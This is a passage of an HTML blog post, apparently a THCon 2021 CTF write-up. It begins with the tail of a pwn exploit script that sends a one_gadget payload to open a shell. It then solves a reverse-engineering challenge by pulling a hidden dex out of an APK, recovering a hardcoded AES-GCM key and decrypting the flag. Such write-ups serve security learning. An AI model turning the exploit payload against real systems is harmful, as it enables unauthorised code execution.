+<span class="n">pay</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+<span class="n">pay</span><span class="o">=</span><span class="n">pay</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h4 id="mission-impossible-rev-246pts"><a href="#mission-impossible-rev-246pts" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Mission Impossible (Rev, 246pts)</h4>
+<ol>
+<li>extract apk and convert dex to jar using dex2jar tools.</li>
+<li>There&rsquo;s nothing &hellip;.:(</li>
+<li>find hidden <code>dex</code> files in `MissionImpossibleTheme.mp3.</li>
+<li>Get this Code with jd-gui.</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">thcon21.ctf.payload</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">android.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.UnsupportedEncodingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.InvalidAlgorithmParameterException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.InvalidKeyException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.NoSuchAlgorithmException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.BadPaddingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.IllegalBlockSizeException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.NoSuchPaddingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.spec.GCMParameterSpec</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MIRead</span>
+<span class="o">{</span>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">CIPHER_ALGO</span> <span class="o">=</span> <span class="s">&#34;AES/GCM/NoPadding&#34;</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">IV</span> <span class="o">=</span> <span class="s">&#34;your_m1ssi0n&#34;</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">KEY</span> <span class="o">=</span> <span class="s">&#34;d0_you_acc3pt_it&#34;</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;AES/GCM/NoPadding&#34;</span><span class="o">);</span>
+  <span class="kd">private</span> <span class="n">GCMParameterSpec</span> <span class="n">parameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GCMParameterSpec</span><span class="o">(</span><span class="n">128</span><span class="o">,</span> <span class="s">&#34;your_m1ssi0n&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">&#34;utf-8&#34;</span><span class="o">));</span>
+  <span class="kd">private</span> <span class="n">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SecretKeySpec</span><span class="o">(</span><span class="s">&#34;d0_you_acc3pt_it&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">&#34;utf-8&#34;</span><span class="o">),</span> <span class="s">&#34;AES&#34;</span><span class="o">);</span>
+  
+  <span class="kd">public</span> <span class="nf">MIRead</span><span class="o">()</span>
+    <span class="kd">throws</span> <span class="n">NoSuchPaddingException</span><span class="o">,</span> <span class="n">NoSuchAlgorithmException</span><span class="o">,</span> <span class="n">UnsupportedEncodingException</span>
+  <span class="o">{}</span>
+  
+  <span class="kd">public</span> <span class="n">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span><span class="o">,</span> <span class="n">BadPaddingException</span><span class="o">,</span> <span class="n">IllegalBlockSizeException</span><span class="o">,</span> <span class="n">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="n">InvalidKeyException</span>
+  <span class="o">{</span>
+    <span class="n">paramString</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">paramString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">&#34;UTF-8&#34;</span><span class="o">),</span> <span class="n">0</span><span class="o">);</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">2</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">secretKeySpec</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">parameterSpec</span><span class="o">);</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramString</span><span class="o">));</span>
+  <span class="o">}</span>
+  
+  <span class="kd">public</span> <span class="n">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span><span class="o">,</span> <span class="n">BadPaddingException</span><span class="o">,</span> <span class="n">IllegalBlockSizeException</span><span class="o">,</span> <span class="n">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="n">InvalidKeyException</span>
+  <span class="o">{</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">1</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">secretKeySpec</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">parameterSpec</span><span class="o">);</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">&#34;utf-8&#34;</span><span class="o">)),</span> <span class="n">0</span><span class="o">));</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">paramArrayOfString</span><span class="o">)</span>
+  <span class="o">{</span>
+    <span class="n">testFlag</span><span class="o">();</span>
+    <span class="n">paramArrayOfString</span> <span class="o">=</span> <span class="n">paramArrayOfString</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">0</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{}</span>
+    <span class="n">Object</span> <span class="n">localObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+    <span class="o">((</span><span class="n">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;IkUegPuai+gfBce7nTf&#34;</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="s">&#34;IkUegPuai+gfBce7nTf&#34;</span> <span class="o">!=</span> <span class="s">&#34;VEhDb24yMQo=&#34;</span><span class="o">)</span>
+    <span class="o">{</span>
+      <span class="o">((</span><span class="n">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;CkMZzZSwne3X3mnyrc5oBcD2yGHUXy&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">else</span>
+    <span class="o">{</span>
+      <span class="o">((</span><span class="n">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;MissionImpossible&#34;</span><span class="o">);</span>
+      <span class="k">return</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="o">((</span><span class="n">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;MMcjCaXX2AAY20H&#34;</span><span class="o">);</span>
+    <span class="n">localObject</span> <span class="o">=</span> <span class="o">((</span><span class="n">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">paramArrayOfString</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;MissionImpossible&#34;</span><span class="o">))</span> <span class="o">{</span>
+      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="n">localObject</span><span class="o">);</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>The secret code is <code>IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H</code>.<br>
+Then, how to decrypt?
+→ this file uses <code>AES/GCM/NoPadding</code> Mode. So I find python code in google. So I modified code and get flag.</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">byte_array</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;{} len[{}]: &#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_array</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">byte_array</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;{:02x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">aad</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">,</span> <span class="n">mac</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">enter dec function ---------------------------------&#39;</span><span class="p">)</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">plain_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_data</span><span class="p">)</span>
+        <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;plain_data&#39;</span><span class="p">,</span> <span class="n">plain_data</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;exit dec function ---------------------------------&#39;</span><span class="p">)</span>        
+        <span class="k">return</span> <span class="n">plain_data</span>
+
+    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+        <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;Key incorrect&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;exit dec function ---------------------------------&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">key</span>   <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;d0_you_acc3pt_it&#34;</span>
+    <span class="n">aad</span>   <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x0A</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x0C</span><span class="p">,</span><span class="mh">0x0D</span><span class="p">,</span><span class="mh">0x0E</span><span class="p">])</span> <span class="c1">#</span>
+    <span class="n">nonce</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;your_m1ssi0n&#34;</span>
+
+    <span class="n">cipher_data</span>  <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H&#34;</span><span class="p">)</span>
+    <span class="n">mac</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">])</span> 
+    
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;aad&#39;</span><span class="p">,</span> <span class="n">aad</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;nonce&#39;</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;cipher data&#39;</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;mac&#39;</span><span class="p">,</span> <span class="n">mac</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">dec</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">aad</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">,</span> <span class="n">mac</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Decrypted value:&#39;</span><span class="p">)</span>
+        <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">result(plain data)&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 ex.py
+key len<span class="o">[</span>16<span class="o">]</span>: 64305f796f755f6163633370745f6974
+aad len<span class="o">[</span>14<span class="o">]</span>: 0102030405060708090a0b0c0d0e
+nonce len<span class="o">[</span>12<span class="o">]</span>: 796f75725f6d31737369306e
+cipher data len<span class="o">[</span>48<span class="o">]</span>: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07
+mac len<span class="o">[</span>16<span class="o">]</span>: b35e5b00e4115439a3f8f9fba375d5e8
+
+enter dec <span class="k">function</span> ---------------------------------
+plain_data len<span class="o">[</span>48<span class="o">]</span>: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63
+<span class="nb">exit</span> dec <span class="k">function</span> ---------------------------------
+
+Decrypted value:
+        result<span class="o">(</span>plain data<span class="o">)</span> len<span class="o">[</span>48<span class="o">]</span>: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63
+
+/mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3
+Python 3.8.5 <span class="o">(</span>default, Jul <span class="m">28</span> 2020, 12:59:40<span class="o">)</span> 
+<span class="o">[</span>GCC 9.3.0<span class="o">]</span> on linux
+Type <span class="s2">&#34;help&#34;</span>, <span class="s2">&#34;copyright&#34;</span>, <span class="s2">&#34;credits&#34;</span> or <span class="s2">&#34;license&#34;</span> <span class="k">for</span> more information.  
+&gt;&gt;&gt; bytes.fromhex<span class="o">(</span><span class="s2">&#34;5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63&#34;</span><span class="o">)</span>
+b<span class="s1">&#39;THCon21{Th1s-Was-Poss1ble-For-U}\x8c\x0c\xdab\xbc\x92\x13V\xee5m\xa0\xfeE}c&#39;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>[END]</p>
+
+            </div>
+
+            
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">See Also:<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/posts/dctf_2021_just_another_heap/" class="related-link">dctf Pwn Write-up</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+    
+
+
+
+        
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+            
+                <li class="post-nav-next">
+                    <a href="/posts/dctf_2021_just_another_heap/" rel="next">dctf Pwn Write-up &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="site-info">©&nbsp;2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Ainsetin</div><div class="powered-by">Powered by <a href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener">Hugo</a> | Theme is <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a></div><div class="site-copyright"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></div>
+
+            
+
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    mediumZoom(document.querySelectorAll('div.post-body img'), {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
